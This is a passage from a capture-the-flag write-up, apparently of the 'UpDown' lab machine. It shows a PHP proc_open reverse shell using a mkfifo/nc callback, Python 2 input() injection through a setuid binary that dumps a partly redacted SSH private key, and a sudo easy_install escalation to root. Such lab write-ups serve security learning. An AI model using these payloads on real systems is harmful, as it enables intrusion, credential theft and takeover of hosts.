So `system` `exec` `shell_exec` `popen` `passthru` `fsockopen` are disabled, now when looking at revshells.com, there is also `proc_open` that we could use, and it's not disabled, but the one on revshells.com also uses fsockopen, and that's disabled, but at least we have a something that we can work with.


## PHP reverse shell with proc-open only
[https://www.php.net/manual/en/function.proc-open.php](https://www.php.net/manual/en/function.proc-open.php)

Looking at the php manual for `proc_open` I managed to get command execution by adapting the first example from the docs:
```php
http://10.10.14.35:8000/elevator
<?php

$cmd = 'id';

$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("file", "/dev/null", "a")
);

$process = proc_open($cmd, $descriptorspec, $pipes);

if (is_resource($process)) {
    fclose($pipes[0]);
    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);
    $return_value = proc_close($process);
    echo "command returned $return_value\n";
}
?>
```

After a bit of trial and error, I could turn that into a working reverse shell,
```bash
http://10.10.14.35:8000/elevator
<?php

$cmd = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.35 4242 >/tmp/f';

$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("file", "/dev/null", "a")
);

$process = proc_open($cmd, $descriptorspec, $pipes);

if (is_resource($process)) {
    fclose($pipes[0]);
    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);
    $return_value = proc_close($process);
    echo "command returned $return_value\n";
}
?>
```


We're now www-data
```
rlwrap nc -lvnp 4242
listening on [any] 4242 ...
connect to [10.10.14.35] from (UNKNOWN) [10.10.11.177] 34648
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ pwd
/var/www/dev/uploads/f5d699dc4397dd6e8d124b297fc3576b
$
```


## Horizontal privilege escalation with python2 input() and setuid

There's this python2 script, in developer's home folder, it's using input(), so you know where this is going 
```bash
$ pwd
/home/developer/dev
$
$
$ cat siteisup_test.py
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
        print "Website is up"
else:
        print "Website is down"$
$
$
```


Next to it is an elf binary of the same name, which is a setuid for developer, when attempting to run it, it seems to be calling the python script, and by extension the input() call.  
```bash
$ ls -la
total 32
drwxr-x--- 2 developer www-data   4096 Jun 22 15:45 .
drwxr-xr-x 6 developer developer  4096 Aug 30 11:24 ..
-rwsr-x--- 1 developer www-data  16928 Jun 22 15:45 siteisup
-rwxr-x--- 1 developer www-data    154 Jun 22 15:45 siteisup_test.py
$ file siteisup
siteisup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b5bbc1de286529f5291b48db8202eefbafc92c1f, for GNU/Linux 3.2.0, not stripped
$
$
$ ./siteisup
asdfasdf
Enter URL here:Traceback (most recent call last):
  File "/home/developer/dev/siteisup_test.py", line 3, in <module>
    url = input("Enter URL here:")
  File "<string>", line 1, in <module>
NameError: name 'asdfasdf' is not defined
Welcome to 'siteisup.htb' application

$
```

After trying a bunch of things from the hacktricks page on python sandbox evasions, we get command execution as developer, and we can steal his ssh private key:   
```bash
$ ./siteisup
__import__("os").system('cat ../.ssh/id_rsa')
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAmvB40TWM8eu0n6FOzixTA1pQ39SpwYyrYCjKrDtp8g5E05EEcJw/
S1qi9PFoNvzkt7Uy3++6xDd95ugAdtuRL7qzA03xSNkqnt2HgjKAPOr6ctIvMDph8JeBF2
F9Sy4XrtfCP76+WpzmxT7utvGD0N1AY3+EGRpOb7q59X0pcPRnIUnxu2sN+vIXjfGvqiAY
ozOB5DeX8rb2bkii6S3Q1tM1VUDoW7cCRbnBMglm2FXEJU9lEv9Py2D4BavFvoUqtT8aCo
********************************SNIP**********************************
gNyFi4s68suDESmL5FCOWUuklrpkNENk7jzjhlzs3gdfU0IRCVpfmiT7LDGwX9YLfsVXtJ
mtpd5SG55TJuGJqXCyeM+U0DBdxsT5AAAAwQDDfs/CULeQUO+2Ij9rWAlKaTEKLkmZjSqB
2d9yJVHHzGPe1DZfRu0nYYonz5bfqoAh2GnYwvIp0h3nzzQo2Svv3/ugRCQwGoFP1zs1aa
ZSESqGN9EfOnUqvQa317rHnO3moDWTnYDbynVJuiQHlDaSCyf+uaZoCMINSG5IOC/4Sj0v
3zga8EzubgwnpU7r9hN2jWboCCIOeDtvXFv08KT8pFDCCA+sMa5uoWQlBqmsOWCLvtaOWe
N4jA+ppn1+3e0AAAASZGV2ZWxvcGVyQHNpdGVpc3VwAQ==
-----END OPENSSH PRIVATE KEY-----
Enter URL here:Traceback (most recent call last):
  File "/home/developer/dev/siteisup_test.py", line 4, in <module>
    page = requests.get(url)
  File "/usr/local/lib/python2.7/dist-packages/requests/api.py", line 75, in get
    return request('get', url, params=params, **kwargs)
  File "/usr/local/lib/python2.7/dist-packages/requests/api.py", line 61, in request
    return session.request(method=method, url=url, **kwargs)
  File "/usr/local/lib/python2.7/dist-packages/requests/sessions.py", line 515, in request
    prep = self.prepare_request(req)
  File "/usr/local/lib/python2.7/dist-packages/requests/sessions.py", line 453, in prepare_request
    hooks=merge_hooks(request.hooks, self.hooks),
  File "/usr/local/lib/python2.7/dist-packages/requests/models.py", line 318, in prepare
    self.prepare_url(url, params)
  File "/usr/local/lib/python2.7/dist-packages/requests/models.py", line 392, in prepare_url
    raise MissingSchema(error)
requests.exceptions.MissingSchema: Invalid URL '0': No scheme supplied. Perhaps you meant http://0?
Welcome to 'siteisup.htb' application
```


## Vertical privilege escalation with sudo no pass on python easy install

Looking at our sudo privileges, there's easy install no pass as root, cool that's a GTFO bin.
```bash
sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
```

[https://gtfobins.github.io/gtfobins/easy_install/](https://gtfobins.github.io/gtfobins/easy_install/)
```bash
developer@updown:/dev/shm$ TF=$(mktemp -d)
developer@updown:/dev/shm$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
developer@updown:/dev/shm$ sudo easy_install $TF
WARNING: The easy_install command is deprecated and will be removed in a future version.
Processing tmp.XSVaEzRIHG
Writing /tmp/tmp.XSVaEzRIHG/setup.cfg
Running setup.py -q bdist_egg --dist-dir /tmp/tmp.XSVaEzRIHG/egg-dist-tmp-zlsf7d
# id
uid=0(root) gid=0(root) groups=0(root)
#
```
